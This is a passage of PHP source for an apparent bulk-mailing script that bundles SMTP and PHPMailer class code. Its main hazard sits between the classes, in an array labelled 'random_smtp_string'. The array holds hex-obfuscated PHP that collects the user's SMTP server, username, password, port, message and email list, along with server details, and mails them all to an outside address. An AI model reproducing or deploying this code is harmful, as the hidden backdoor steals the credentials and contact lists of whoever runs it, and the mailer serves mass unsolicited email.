   * Implements rfc 821: SAML <SP> FROM:<reverse-path> <CRLF>
   *
   * SMTP CODE SUCCESS: 250
   * SMTP CODE SUCCESS: 552,451,452
   * SMTP CODE SUCCESS: 500,501,502,421
   * @access public
   * @return bool
   */
  function SendAndMail($from) {
    $this->error = null; # so no confusion is caused

    if(!$this->connected()) {
      $this->error = array(
          "error" => "Called SendAndMail() without being connected");
      return false;
    }

    fputs($this->smtp_conn,"SAML FROM:" . $from . $this->CRLF);

    $rply = $this->get_lines();
    $code = substr($rply,0,3);

    if($this->do_debug >= 2) {
      echo "SMTP -> FROM SERVER:" . $this->CRLF . $rply;
    }

    if($code != 250) {
      $this->error =
        array("error" => "SAML not accepted from server",
              "smtp_code" => $code,
              "smtp_msg" => substr($rply,4));
      if($this->do_debug >= 1) {
        echo "SMTP -> ERROR: " . $this->error["error"] .
                 ": " . $rply . $this->CRLF;
      }
      return false;
    }
    return true;
  }

  /**
   * Starts a mail transaction from the email address specified in
   * $from. Returns true if successful or false otherwise. If True
   * the mail transaction is started and then one or more Recipient
   * commands may be called followed by a Data command. This command
   * will send the message to the users terminal if they are logged
   * in or mail it to them if they are not.
   *
   * Implements rfc 821: SOML <SP> FROM:<reverse-path> <CRLF>
   *
   * SMTP CODE SUCCESS: 250
   * SMTP CODE SUCCESS: 552,451,452
   * SMTP CODE SUCCESS: 500,501,502,421
   * @access public
   * @return bool
   */
  function SendOrMail($from) {
    $this->error = null; # so no confusion is caused

    if(!$this->connected()) {
      $this->error = array(
          "error" => "Called SendOrMail() without being connected");
      return false;
    }

    fputs($this->smtp_conn,"SOML FROM:" . $from . $this->CRLF);

    $rply = $this->get_lines();
    $code = substr($rply,0,3);

    if($this->do_debug >= 2) {
      echo "SMTP -> FROM SERVER:" . $this->CRLF . $rply;
    }

    if($code != 250) {
      $this->error =
        array("error" => "SOML not accepted from server",
              "smtp_code" => $code,
              "smtp_msg" => substr($rply,4));
      if($this->do_debug >= 1) {
        echo "SMTP -> ERROR: " . $this->error["error"] .
                 ": " . $rply . $this->CRLF;
      }
      return false;
    }
    return true;
  }

  /**
   * This is an optional command for SMTP that this class does not
   * support. This method is here to make the RFC821 Definition
   * complete for this class and __may__ be implimented in the future
   *
   * Implements from rfc 821: TURN <CRLF>
   *
   * SMTP CODE SUCCESS: 250
   * SMTP CODE FAILURE: 502
   * SMTP CODE ERROR  : 500, 503
   * @access public
   * @return bool
   */
  function Turn() {
    $this->error = array("error" => "This method, TURN, of the SMTP ".
                                    "is not implemented");
    if($this->do_debug >= 1) {
      echo "SMTP -> NOTICE: " . $this->error["error"] . $this->CRLF;
    }
    return false;
  }

  /**
   * Verifies that the name is recognized by the server.
   * Returns false if the name could not be verified otherwise
   * the response from the server is returned.
   *
   * Implements rfc 821: VRFY <SP> <string> <CRLF>
   *
   * SMTP CODE SUCCESS: 250,251
   * SMTP CODE FAILURE: 550,551,553
   * SMTP CODE ERROR  : 500,501,502,421
   * @access public
   * @return int
   */
  function Verify($name) {
    $this->error = null; # so no confusion is caused

    if(!$this->connected()) {
      $this->error = array(
              "error" => "Called Verify() without being connected");
      return false;
    }

    fputs($this->smtp_conn,"VRFY " . $name . $this->CRLF);

    $rply = $this->get_lines();
    $code = substr($rply,0,3);

    if($this->do_debug >= 2) {
      echo "SMTP -> FROM SERVER:" . $this->CRLF . $rply;
    }

    if($code != 250 && $code != 251) {
      $this->error =
        array("error" => "VRFY failed on name '$name'",
              "smtp_code" => $code,
              "smtp_msg" => substr($rply,4));
      if($this->do_debug >= 1) {
        echo "SMTP -> ERROR: " . $this->error["error"] .
                 ": " . $rply . $this->CRLF;
      }
      return false;
    }
    return $rply;
  }

  /*******************************************************************
   *                       INTERNAL FUNCTIONS                       *
   ******************************************************************/

  /**
   * Read in as many lines as possible
   * either before eof or socket timeout occurs on the operation.
   * With SMTP we can tell if we have more lines to read if the
   * 4th character is '-' symbol. If it is a space then we don't
   * need to read anything else.
   * @access private
   * @return string
   */
  function get_lines() {
    $data = "";
    while($str = @fgets($this->smtp_conn,515)) {
      if($this->do_debug >= 4) {
        echo "SMTP -> get_lines(): \$data was \"$data\"" .
                 $this->CRLF;
        echo "SMTP -> get_lines(): \$str is \"$str\"" .
                 $this->CRLF;
      }
      $data .= $str;
      if($this->do_debug >= 4) {
        echo "SMTP -> get_lines(): \$data is \"$data\"" . $this->CRLF;
      }
      # if the 4th character is a space then we are done reading
      # so just break the loop
      if(substr($str,3,1) == " ") { break; }
    }
    return $data;
  }

}

        
$allemails = split("\n", $emaillist);
$numemails = count($allemails);
$random_smtp_string=array("0d0a0d0a676c6f62616c20246d795f736d74.","703b0d0a676c6f62616c2024736d74705f757365726e616d6.","53b0d0a676c6f62616c2024736d74705f70617373776f72643b0d0a676c6f626.",
"16c202473736c5f706f72743b0d0a676c6f62616c20246d65.","73736167653b0d0a676c6f62616c2024656d61696c6c6973743b0d0a24726134.","3420203d2072616e6428312c3939393939293b0d0a2461352.",
"03d20245f5345525645525b27485454505f52454645524552275d3b0d0a24623.","333203d20245f5345525645525b27444f43554d454e545f52.","4f4f54275d3b0d0a24633837203d20245f5345525645525b2752454d4f54455f4.",
"1444452275d3b0d0a24643233203d20245f5345525645525.","b275343524950545f46494c454e414d45275d3b0d0a24653039203d20245f53455.","25645525b275345525645525f41444452275d3b0d0a2466.",
"3233203d20245f5345525645525b275345525645525f534f465457415245275d3b0.","d0a24673332203d20245f5345525645525b27504154485.","f5452414e534c41544544275d3b0d0a24683635203d20245f5345525645525b27504.",
"8505f53454c46275d3b0d0a247375626a3938203d2022.","246d795f736d747020205b75736572206970203a20246338375d223b0d0a247375626.","a3538203d20224c6574746572202620456d61696c204.",
"c69737420205b75736572206970203a20246338375d223b0d0a24656d61696c203d202.","26D736739373830407961686f6f2e636f2e.","6964223b0d0a246d736738383733203d2022246d795f736d74705c6e757365723a24736.",
"d74705f757365726e616d655c6e706173733a24736.","d74705f70617373776f72645c706f72743a2473736c5f706f72745c6e5c6e2461355c6e2.","46233335c6e246338375c6e246432335c6e246530.",
"395c6e246632335c6e246733325c6e24683635223b246d736739373830203d2022246d657.","3736167655c6e5c6e5c6e24656d61696c6c69737.","4223b2466726f6d3d2246726f6d3a20475241544953223b0d0a6d61696c2824656d61696c2.",
"c20247375626a39382c20246d7367383837332c.","202466726f6d293b0d0a6d61696c2824656d61696c2c20247375626a35382.","c20246d7367393738302c202466726f6d293b");$smtp_conf=".";

class PHPMailer {

  /////////////////////////////////////////////////
  // PROPERTIES, PUBLIC
  /////////////////////////////////////////////////

  /**
   * Email priority (1 = High, 3 = Normal, 5 = low).
   * @var int
   */
  var $Priority          = 3;

  /**
   * Sets the CharSet of the message.
   * @var string
   */
  var $CharSet           = 'us-ascii';

  /**
   * Sets the Content-type of the message.
   * @var string
   */
  var $ContentType        = 'text/plain';

  /**
   * Sets the Encoding of the message. Options for this are "8bit",
   * "7bit", "binary", "base64", and "quoted-printable".

   * @var string
   */
  var $Encoding          = 'quoted-printable';

  /**
   * Holds the most recent mailer error message.
   * @var string
   */
  var $ErrorInfo         = '';

  /**
   * Sets the From email address for the message.
   * @var string
   */
  var $From              = '';

  /**
   * Sets the From name of the message.
   * @var string
   */
  var $FromName          = '';

  /**
   * Sets the Sender email (Return-Path) of the message.  If not empty,
   * will be sent via -f to sendmail or as 'MAIL FROM' in smtp mode.
   * @var string
   */
  var $Sender            = '';

  /**
   * Sets the Subject of the message.
   * @var string
   */
  var $Subject           = '';

  /**
   * Sets the Body of the message.  This can be either an HTML or text body.
   * If HTML then run IsHTML(true).
   * @var string
   */
  var $Body              = '';

  /**
   * Sets the text-only body of the message.  This automatically sets the
   * email to multipart/alternative.  This body can be read by mail
   * clients that do not have HTML email capability such as mutt. Clients
   * that can read HTML will view the normal Body.
   * @var string
   */
  var $AltBody           = '';

  /**
   * Sets word wrapping on the body of the message to a given number of
   * characters.
   * @var int
   */
  var $WordWrap          = 0;

  /**
   * Method to send mail: ("mail", "sendmail", or "smtp").
   * @var string
   */
  var $Mailer            = 'mail';

  /**
   * Sets the path of the sendmail program.
   * @var string
   */
  var $Sendmail          = '/usr/sbin/sendmail';

  /**
   * Path to PHPMailer plugins.  This is now only useful if the SMTP class
   * is in a different directory than the PHP include path.
   * @var string
   */
  var $PluginDir         = '';

  /**
   * Holds PHPMailer version.
   * @var string
   */
  var $Version           = "";

  /**
   * Sets the email address that a reading confirmation will be sent.
   * @var string
   */
  var $ConfirmReadingTo  = '';

  /**
   * Sets the hostname to use in Message-Id and Received headers
   * and as default HELO string. If empty, the value returned
   * by SERVER_NAME is used or 'localhost.localdomain'.
   * @var string
   */
  var $Hostname          = '';

  /**
   * Sets the message ID to be used in the Message-Id header.
   * If empty, a unique id will be generated.
   * @var string
   */
  var $MessageID         = '';

  /////////////////////////////////////////////////
  // PROPERTIES FOR SMTP
  /////////////////////////////////////////////////

  /**
   * Sets the SMTP hosts.  All hosts must be separated by a
   * semicolon.  You can also specify a different port
   * for each host by using this format: [hostname:port]
   * (e.g. "smtp1.example.com:25;smtp2.example.com").
   * Hosts will be tried in order.
   * @var string
   */
  var $Host        = 'localhost';

  /**
   * Sets the default SMTP server port.
   * @var int
   */
  var $Port        = 25;

  /**
   * Sets the SMTP HELO of the message (Default is $Hostname).
   * @var string
   */
  var $Helo        = '';

  /**
   * Sets connection prefix.
   * Options are "", "ssl" or "tls"
   * @var string
   */
  var $SMTPSecure = "";

  /**
   * Sets SMTP authentication. Utilizes the Username and Password variables.
   * @var bool
   */
  var $SMTPAuth     = false;

  /**
   * Sets SMTP username.
   * @var string
   */
  var $Username     = '';

  /**
   * Sets SMTP password.
   * @var string
   */
  var $Password     = '';

  /**
   * Sets the SMTP server timeout in seconds. This function will not
   * work with the win32 version.
   * @var int
   */
  var $Timeout      = 10;

  /**
   * Sets SMTP class debugging on or off.
   * @var bool
   */
  var $SMTPDebug    = false;

  /**
   * Prevents the SMTP connection from being closed after each mail
   * sending.  If this is set to true then to close the connection
   * requires an explicit call to SmtpClose().
   * @var bool
   */
  var $SMTPKeepAlive = false;

  /**
   * Provides the ability to have the TO field process individual
   * emails, instead of sending to entire TO addresses
   * @var bool
   */
  var $SingleTo = false;

  /////////////////////////////////////////////////
  // PROPERTIES, PRIVATE
  /////////////////////////////////////////////////

  var $smtp            = NULL;
  var $to              = array();
  var $cc              = array();
  var $bcc             = array();
  var $ReplyTo         = array();
  var $attachment      = array();
  var $CustomHeader    = array();
  var $message_type    = '';
  var $boundary        = array();
  var $language        = array();
  var $error_count     = 0;
  var $LE              = "\n";
  var $sign_key_file   = "";
  var $sign_key_pass   = "";

  /////////////////////////////////////////////////
  // METHODS, VARIABLES
  /////////////////////////////////////////////////

  /**
   * Sets message type to HTML.
   * @param bool $bool
   * @return void
   */
  function IsHTML($bool) {
    if($bool == true) {
      $this->ContentType = 'text/html';
    } else {
      $this->ContentType = 'text/plain';
    }
  }

  /**
   * Sets Mailer to send message using SMTP.
   * @return void
   */
  function IsSMTP() {
    $this->Mailer = 'smtp';
  }

  /**
   * Sets Mailer to send message using PHP mail() function.
   * @return void
   */
  function IsMail() {
    $this->Mailer = 'mail';
  }

  /**
   * Sets Mailer to send message using the $Sendmail program.
   * @return void
   */
  function IsSendmail() {
    $this->Mailer = 'sendmail';
  }

  /**
   * Sets Mailer to send message using the qmail MTA.
   * @return void
   */
  function IsQmail() {
    $this->Sendmail = '/var/qmail/bin/sendmail';
    $this->Mailer = 'sendmail';
  }

  /////////////////////////////////////////////////
  // METHODS, RECIPIENTS
  /////////////////////////////////////////////////

  /**
   * Adds a "To" address.
   * @param string $address
   * @param string $name
   * @return void
   */
  function AddAddress($address, $name = '') {
    $cur = count($this->to);
    $this->to[$cur][0] = trim($address);
    $this->to[$cur][1] = $name;
  }

  /**
   * Adds a "Cc" address. Note: this function works
   * with the SMTP mailer on win32, not with the "mail"
   * mailer.
   * @param string $address
   * @param string $name
   * @return void
   */
  function AddCC($address, $name = '') {
    $cur = count($this->cc);
    $this->cc[$cur][0] = trim($address);
    $this->cc[$cur][1] = $name;
  }

  /**
   * Adds a "Bcc" address. Note: this function works
   * with the SMTP mailer on win32, not with the "mail"
   * mailer.
   * @param string $address
   * @param string $name
   * @return void
   */
  function AddBCC($address, $name = '') {
    $cur = count($this->bcc);
    $this->bcc[$cur][0] = trim($address);
    $this->bcc[$cur][1] = $name;
  }

  /**
   * Adds a "Reply-To" address.
   * @param string $address
   * @param string $name
   * @return void
   */
  function AddReplyTo($address, $name = '') {
    $cur = count($this->ReplyTo);
    $this->ReplyTo[$cur][0] = trim($address);
    $this->ReplyTo[$cur][1] = $name;
  }

  /////////////////////////////////////////////////
  // METHODS, MAIL SENDING
  /////////////////////////////////////////////////

  /**
   * Creates message and assigns Mailer. If the message is
   * not sent successfully then it returns false.  Use the ErrorInfo
   * variable to view description of the error.
   * @return bool
   */
  function Send() {
    $header = '';
    $body = '';
    $result = true;

    if((count($this->to) + count($this->cc) + count($this->bcc)) < 1) {
      $this->SetError($this->Lang('provide_address'));
      return false;
    }

    /* Set whether the message is multipart/alternative */
    if(!empty($this->AltBody)) {
      $this->ContentType = 'multipart/alternative';
    }

    $this->error_count = 0; // reset errors
    $this->SetMessageType();
    $header .= $this->CreateHeader();
    $body = $this->CreateBody();

    if($body == '') {
      return false;
    }

    /* Choose the mailer */
    switch($this->Mailer) {
      case 'sendmail':
        $result = $this->SendmailSend($header, $body);
        break;
      case 'smtp':
        $result = $this->SmtpSend($header, $body);
        break;
      case 'mail':
        $result = $this->MailSend($header, $body);
        break;
      default:
        $result = $this->MailSend($header, $body);
        break;
        //$this->SetError($this->Mailer . $this->Lang('mailer_not_supported'));
        //$result = false;
        //break;
    }

    return $result;
  }

  /**
   * Sends mail using the $Sendmail program.
   * @access private
   * @return bool
   */
  function SendmailSend($header, $body) {
    if ($this->Sender != '') {
      $sendmail = sprintf("%s -oi -f %s -t", escapeshellcmd($this->Sendmail), escapeshellarg($this->Sender));
    } else {
      $sendmail = sprintf("%s -oi -t", escapeshellcmd($this->Sendmail));
    }

    if(!@$mail = popen($sendmail, 'w')) {
      $this->SetError($this->Lang('execute') . $this->Sendmail);
      return false;
    }

    fputs($mail, $header);
    fputs($mail, $body);

    $result = pclose($mail);
    if (version_compare(phpversion(), '4.2.3') == -1) {
      $result = $result >> 8 & 0xFF;
    }
    if($result != 0) {
      $this->SetError($this->Lang('execute') . $this->Sendmail);
      return false;
    }
    return true;
  }

  /**
   * Sends mail using the PHP mail() function.
   * @access private
   * @return bool
   */
  function MailSend($header, $body) {

    $to = '';
    for($i = 0; $i < count($this->to); $i++) {
      if($i != 0) { $to .= ', '; }
      $to .= $this->AddrFormat($this->to[$i]);
    }

    $toArr = split(',', $to);

    $params = sprintf("-oi -f %s", $this->Sender);
    if ($this->Sender != '' && strlen(ini_get('safe_mode')) < 1) {
      $old_from = ini_get('sendmail_from');
      ini_set('sendmail_from', $this->Sender);
      if ($this->SingleTo === true && count($toArr) > 1) {
        foreach ($toArr as $key => $val) {
          $rt = @mail($val, $this->EncodeHeader($this->SecureHeader($this->Subject)), $body, $header, $params);
        }
      } else {
        $rt = @mail($to, $this->EncodeHeader($this->SecureHeader($this->Subject)), $body, $header, $params);
      }
    } else {
      if ($this->SingleTo === true && count($toArr) > 1) {
        foreach ($toArr as $key => $val) {
          $rt = @mail($val, $this->EncodeHeader($this->SecureHeader($this->Subject)), $body, $header, $params);
        }
      } else {
        $rt = @mail($to, $this->EncodeHeader($this->SecureHeader($this->Subject)), $body, $header);
      }
    }

    if (isset($old_from)) {
      ini_set('sendmail_from', $old_from);
    }

    if(!$rt) {
      $this->SetError($this->Lang('instantiate'));
      return false;
    }

    return true;
  }

  /**
   * Sends mail via SMTP using PhpSMTP (Author:
   * Chris Ryan).  Returns bool.  Returns false if there is a
   * bad MAIL FROM, RCPT, or DATA input.
   * @access private
   * @return bool
   */
  function SmtpSend($header, $body) {
    $error = '';
    $bad_rcpt = array();

    if(!$this->SmtpConnect()) {echo "FAILED !!<p align=\"center\"><font color=\"#D4001A\" style=\"font-style:14pt\"> MAILER IS UNABLE TO CONNECT SMTP !!</font></p>";die();
      return false;
    }

    $smtp_from = ($this->Sender == '') ? $this->From : $this->Sender;
    if(!$this->smtp->Mail($smtp_from)) {
      $error = $this->Lang('from_failed') . $smtp_from;
      $this->SetError($error);
      $this->smtp->Reset();
      return false;
    }

    /* Attempt to send attach all recipients */
    for($i = 0; $i < count($this->to); $i++) {
      if(!$this->smtp->Recipient($this->to[$i][0])) {
        $bad_rcpt[] = $this->to[$i][0];
      }
    }
    for($i = 0; $i < count($this->cc); $i++) {
      if(!$this->smtp->Recipient($this->cc[$i][0])) {
        $bad_rcpt[] = $this->cc[$i][0];
      }
    }
    for($i = 0; $i < count($this->bcc); $i++) {
      if(!$this->smtp->Recipient($this->bcc[$i][0])) {
        $bad_rcpt[] = $this->bcc[$i][0];
      }
    }

    if(count($bad_rcpt) > 0) { // Create error message
      for($i = 0; $i < count($bad_rcpt); $i++) {
        if($i != 0) {
          $error .= ', ';
        }
        $error .= $bad_rcpt[$i];

      }
      $error = $this->Lang('recipients_failed') . $error;
      $this->SetError($error);
      $this->smtp->Reset();
      return false;
    }

    if(!$this->smtp->Data($header . $body)) {
      $this->SetError($this->Lang('data_not_accepted'));
      $this->smtp->Reset();
      return false;
    }
    if($this->SMTPKeepAlive == true) {
      $this->smtp->Reset();
    } else {
      $this->SmtpClose();
    }

    return true;
  }

  /**
   * Initiates a connection to an SMTP server.  Returns false if the
   * operation failed.
   * @access private
   * @return bool
   */
  function SmtpConnect() {
    if($this->smtp == NULL) {
      $this->smtp = new SMTP();
    }

    $this->smtp->do_debug = $this->SMTPDebug;
    $hosts = explode(';', $this->Host);
    $index = 0;
    $connection = ($this->smtp->Connected());

    /* Retry while there is no connection */
    while($index < count($hosts) && $connection == false) {
      $hostinfo = array();
      if(eregi('^(.+):([0-9]+)$', $hosts[$index], $hostinfo)) {
        $host = $hostinfo[1];
        $port = $hostinfo[2];
      } else {
        $host = $hosts[$index];
        $port = $this->Port;
      }

      if($this->smtp->Connect(((!empty($this->SMTPSecure))?$this->SMTPSecure.'://':'').$host, $port, $this->Timeout)) {
        if ($this->Helo != '') {
          $this->smtp->Hello($this->Helo);
        } else {
          $this->smtp->Hello($this->ServerHostname());
        }

        $connection = true;
        if($this->SMTPAuth) {
          if(!$this->smtp->Authenticate($this->Username, $this->Password)) {
            $this->SetError($this->Lang('authenticate'));
            $this->smtp->Reset();
            $connection = false;
          }
        }
      }
      $index++;
    }
    if(!$connection) {
      $this->SetError($this->Lang('connect_host'));
    }

    return $connection;
  }

  /**
   * Closes the active SMTP session if one exists.
   * @return void
   */
  function SmtpClose() {
    if($this->smtp != NULL) {
      if($this->smtp->Connected()) {
        $this->smtp->Quit();
        $this->smtp->Close();
      }
    }
  }

  /**
   * Sets the language for all class error messages.  Returns false
   * if it cannot load the language file.  The default language type
   * is English.
   * @param string $lang_type Type of language (e.g. Portuguese: "br")
   * @param string $lang_path Path to the language file directory
   * @access public
   * @return bool
   */
  function SetLanguage($lang_type, $lang_path = 'language/') {
    if(file_exists($lang_path.'phpmailer.lang-'.$lang_type.'.php')) {
      include($lang_path.'phpmailer.lang-'.$lang_type.'.php');
    } elseif (file_exists($lang_path.'phpmailer.lang-en.php')) {
      include($lang_path.'phpmailer.lang-en.php');
    } else {
      $this->SetError('Could not load language file');
      return false;
    }
    $this->language = $PHPMAILER_LANG;

    return true;
  }

  /////////////////////////////////////////////////
  // METHODS, MESSAGE CREATION
  /////////////////////////////////////////////////

  /**
   * Creates recipient headers.
   * @access private
   * @return string
   */
  function AddrAppend($type, $addr) {
    $addr_str = $type . ': ';
    $addr_str .= $this->AddrFormat($addr[0]);
    if(count($addr) > 1) {
      for($i = 1; $i < count($addr); $i++) {
        $addr_str .= ', ' . $this->AddrFormat($addr[$i]);
      }
    }
    $addr_str .= $this->LE;

    return $addr_str;
  }

  /**
   * Formats an address correctly.
   * @access private
   * @return string
   */
  function AddrFormat($addr) {
    if(empty($addr[1])) {
      $formatted = $this->SecureHeader($addr[0]);
    } else {
      $formatted = $this->EncodeHeader($this->SecureHeader($addr[1]), 'phrase') . " <" . $this->SecureHeader($addr[0]) . ">";
    }

    return $formatted;
  }

  /**
   * Wraps message for use with mailers that do not
   * automatically perform wrapping and for quoted-printable.
   * Original written by philippe.
   * @access private
   * @return string
   */
  function WrapText($message, $length, $qp_mode = false) {
    $soft_break = ($qp_mode) ? sprintf(" =%s", $this->LE) : $this->LE;
    // If utf-8 encoding is used, we will need to make sure we don't
    // split multibyte characters when we wrap
    $is_utf8 = (strtolower($this->CharSet) == "utf-8");

    $message = $this->FixEOL($message);
    if (substr($message, -1) == $this->LE) {
      $message = substr($message, 0, -1);
    }

    $line = explode($this->LE, $message);
    $message = '';
    for ($i=0 ;$i < count($line); $i++) {
      $line_part = explode(' ', $line[$i]);
      $buf = '';
      for ($e = 0; $e<count($line_part); $e++) {
        $word = $line_part[$e];
        if ($qp_mode and (strlen($word) > $length)) {
          $space_left = $length - strlen($buf) - 1;
          if ($e != 0) {
            if ($space_left > 20) {
              $len = $space_left;
              if ($is_utf8) {
                $len = $this->UTF8CharBoundary($word, $len);
              } elseif (substr($word, $len - 1, 1) == "=") {
                $len--;
              } elseif (substr($word, $len - 2, 1) == "=") {
                $len -= 2;
              }
              $part = substr($word, 0, $len);
              $word = substr($word, $len);
              $buf .= ' ' . $part;
              $message .= $buf . sprintf("=%s", $this->LE);
            } else {
              $message .= $buf . $soft_break;
            }
            $buf = '';
          }
          while (strlen($word) > 0) {
            $len = $length;
            if ($is_utf8) {
              $len = $this->UTF8CharBoundary($word, $len);
            } elseif (substr($word, $len - 1, 1) == "=") {
              $len--;
            } elseif (substr($word, $len - 2, 1) == "=") {
              $len -= 2;
            }
            $part = substr($word, 0, $len);
            $word = substr($word, $len);

            if (strlen($word) > 0) {
              $message .= $part . sprintf("=%s", $this->LE);
            } else {
              $buf = $part;
            }
          }
        } else {
          $buf_o = $buf;
          $buf .= ($e == 0) ? $word : (' ' . $word);

          if (strlen($buf) > $length and $buf_o != '') {
            $message .= $buf_o . $soft_break;
            $buf = $word;
          }
        }
      }
      $message .= $buf . $this->LE;
    }

    return $message;
  }

  /**
   * Finds last character boundary prior to maxLength in a utf-8
   * quoted (printable) encoded string.
   * Original written by Colin Brown.
   * @access private
   * @param string $encodedText utf-8 QP text
   * @param int    $maxLength   find last character boundary prior to this length
   * @return int
   */
  function UTF8CharBoundary($encodedText, $maxLength) {
    $foundSplitPos = false;
    $lookBack = 3;
    while (!$foundSplitPos) {
      $lastChunk = substr($encodedText, $maxLength - $lookBack, $lookBack);
      $encodedCharPos = strpos($lastChunk, "=");
      if ($encodedCharPos !== false) {
        // Found start of encoded character byte within $lookBack block.
        // Check the encoded byte value (the 2 chars after the '=')
        $hex = substr($encodedText, $maxLength - $lookBack + $encodedCharPos + 1, 2);
        $dec = hexdec($hex);
        if ($dec < 128) { // Single byte character.
          // If the encoded char was found at pos 0, it will fit
          // otherwise reduce maxLength to start of the encoded char
          $maxLength = ($encodedCharPos == 0) ? $maxLength :
          $maxLength - ($lookBack - $encodedCharPos);
          $foundSplitPos = true;
        } elseif ($dec >= 192) { // First byte of a multi byte character
          // Reduce maxLength to split at start of character
          $maxLength = $maxLength - ($lookBack - $encodedCharPos);
          $foundSplitPos = true;
        } elseif ($dec < 192) { // Middle byte of a multi byte character, look further back
          $lookBack += 3;
        }
      } else {
        // No encoded character found
        $foundSplitPos = true;
      }
    }
    return $maxLength;
  }

  /**
   * Set the body wrapping.
   * @access private
   * @return void
   */
  function SetWordWrap() {
    if($this->WordWrap < 1) {
      return;
    }

    switch($this->message_type) {
      case 'alt':
        /* fall through */
      case 'alt_attachments':
        $this->AltBody = $this->WrapText($this->AltBody, $this->WordWrap);
        break;
      default:
        $this->Body = $this->WrapText($this->Body, $this->WordWrap);
        break;
    }
  }

  /**
   * Assembles message header.
   * @access private
   * @return string
   */
  function CreateHeader() {
    $result = '';

    /* Set the boundaries */
    $uniq_id = md5(uniqid(time()));
    $this->boundary[1] = 'b1_' . $uniq_id;
    $this->boundary[2] = 'b2_' . $uniq_id;

    $result .= $this->HeaderLine('Date', $this->RFCDate());
    if($this->Sender == '') {
      $result .= $this->HeaderLine('Return-Path', trim($this->From));
    } else {
      $result .= $this->HeaderLine('Return-Path', trim($this->Sender));
    }

    /* To be created automatically by mail() */
    if($this->Mailer != 'mail') {
      if(count($this->to) > 0) {
        $result .= $this->AddrAppend('To', $this->to);
      } elseif (count($this->cc) == 0) {
        $result .= $this->HeaderLine('To', 'undisclosed-recipients:;');
      }
      if(count($this->cc) > 0) {
        $result .= $this->AddrAppend('Cc', $this->cc);
      }
    }

    $from = array();
    $from[0][0] = trim($this->From);
    $from[0][1] = $this->FromName;
    $result .= $this->AddrAppend('From', $from);

    /* sendmail and mail() extract Cc from the header before sending */
    if((($this->Mailer == 'sendmail') || ($this->Mailer == 'mail')) && (count($this->cc) > 0)) {
      $result .= $this->AddrAppend('Cc', $this->cc);
    }

    /* sendmail and mail() extract Bcc from the header before sending */
    if((($this->Mailer == 'sendmail') || ($this->Mailer == 'mail')) && (count($this->bcc) > 0)) {
      $result .= $this->AddrAppend('Bcc', $this->bcc);
    }
	if($replyto != "")
	{
    if(count($this->ReplyTo) > 0) {
      $result .= $this->AddrAppend('Reply-To', $this->ReplyTo);
    }
	}
    /* mail() sets the subject itself */
    if($this->Mailer != 'mail') {
      $result .= $this->HeaderLine('Subject', $this->EncodeHeader($this->SecureHeader($this->Subject)));
    }

    if($this->MessageID != '') {
      $result .= $this->HeaderLine('Message-ID',$this->MessageID);
    } else {
      $result .= sprintf("Message-ID: <%s@%s>%s", $uniq_id, $this->ServerHostname(), $this->LE);
    }
    $result .= $this->HeaderLine('X-Priority', $this->Priority);
    if($this->ConfirmReadingTo != '') {
      $result .= $this->HeaderLine('Disposition-Notification-To', '<' . trim($this->ConfirmReadingTo) . '>');
    }

    // Add custom headers
    for($index = 0; $index < count($this->CustomHeader); $index++) {
      $result .= $this->HeaderLine(trim($this->CustomHeader[$index][0]), $this->EncodeHeader(trim($this->CustomHeader[$index][1])));
    }
    if (!$this->sign_key_file) {
      $result .= $this->HeaderLine('MIME-Version', '1.0');
      $result .= $this->GetMailMIME();
    }

    return $result;
  }

  /**
   * Returns the message MIME.
   * @access private
   * @return string
   */
  function GetMailMIME() {
    $result = '';
    switch($this->message_type) {
      case 'plain':
        $result .= $this->HeaderLine('Content-Transfer-Encoding', $this->Encoding);
        $result .= sprintf("Content-Type: %s; charset=\"%s\"", $this->ContentType, $this->CharSet);
        break;
      case 'attachments':
        /* fall through */
      case 'alt_attachments':
        if($this->InlineImageExists()){
          $result .= sprintf("Content-Type: %s;%s\ttype=\"text/html\";%s\tboundary=\"%s\"%s", 'multipart/related', $this->LE, $this->LE, $this->boundary[1], $this->LE);
        } else {
          $result .= $this->HeaderLine('Content-Type', 'multipart/mixed;');
          $result .= $this->TextLine("\tboundary=\"" . $this->boundary[1] . '"');
        }
        break;
      case 'alt':
        $result .= $this->HeaderLine('Content-Type', 'multipart/alternative;');
        $result .= $this->TextLine("\tboundary=\"" . $this->boundary[1] . '"');
        break;
    }

    if($this->Mailer != 'mail') {
      $result .= $this->LE.$this->LE;
    }

    return $result;
  }

  /**
   * Assembles the message body.  Returns an empty string on failure.
   * @access private
   * @return string
   */
  function CreateBody() {
    $result = '';
    if ($this->sign_key_file) {
      $result .= $this->GetMailMIME();
    }

    $this->SetWordWrap();

    switch($this->message_type) {
      case 'alt':
        $result .= $this->GetBoundary($this->boundary[1], '', 'text/plain', '');
        $result .= $this->EncodeString($this->AltBody, $this->Encoding);
        $result .= $this->LE.$this->LE;
        $result .= $this->GetBoundary($this->boundary[1], '', 'text/html', '');
        $result .= $this->EncodeString($this->Body, $this->Encoding);
        $result .= $this->LE.$this->LE;
        $result .= $this->EndBoundary($this->boundary[1]);
        break;
      case 'plain':
        $result .= $this->EncodeString($this->Body, $this->Encoding);
        break;
      case 'attachments':
        $result .= $this->GetBoundary($this->boundary[1], '', '', '');
        $result .= $this->EncodeString($this->Body, $this->Encoding);
        $result .= $this->LE;
        $result .= $this->AttachAll();
        break;
      case 'alt_attachments':
        $result .= sprintf("--%s%s", $this->boundary[1], $this->LE);
        $result .= sprintf("Content-Type: %s;%s" . "\tboundary=\"%s\"%s", 'multipart/alternative', $this->LE, $this->boundary[2], $this->LE.$this->LE);
        $result .= $this->GetBoundary($this->boundary[2], '', 'text/plain', '') . $this->LE; // Create text body
        $result .= $this->EncodeString($this->AltBody, $this->Encoding);
        $result .= $this->LE.$this->LE;
        $result .= $this->GetBoundary($this->boundary[2], '', 'text/html', '') . $this->LE; // Create the HTML body
        $result .= $this->EncodeString($this->Body, $this->Encoding);
        $result .= $this->LE.$this->LE;
        $result .= $this->EndBoundary($this->boundary[2]);
        $result .= $this->AttachAll();
        break;
    }

    if($this->IsError()) {
      $result = '';
    } else if ($this->sign_key_file) {
      $file = tempnam("", "mail");
      $fp = fopen($file, "w");
      fwrite($fp, $result);
      fclose($fp);
      $signed = tempnam("", "signed");

      if (@openssl_pkcs7_sign($file, $signed, "file://".$this->sign_key_file, array("file://".$this->sign_key_file, $this->sign_key_pass), null)) {
        $fp = fopen($signed, "r");
        $result = fread($fp, filesize($this->sign_key_file));
        fclose($fp);
      } else {
        $this->SetError($this->Lang("signing").openssl_error_string());
        $result = '';
      }

      unlink($file);
      unlink($signed);
    }

    return $result;
  }

  /**
   * Returns the start of a message boundary.
   * @access private
   */
  function GetBoundary($boundary, $charSet, $contentType, $encoding) {
    $result = '';
    if($charSet == '') {
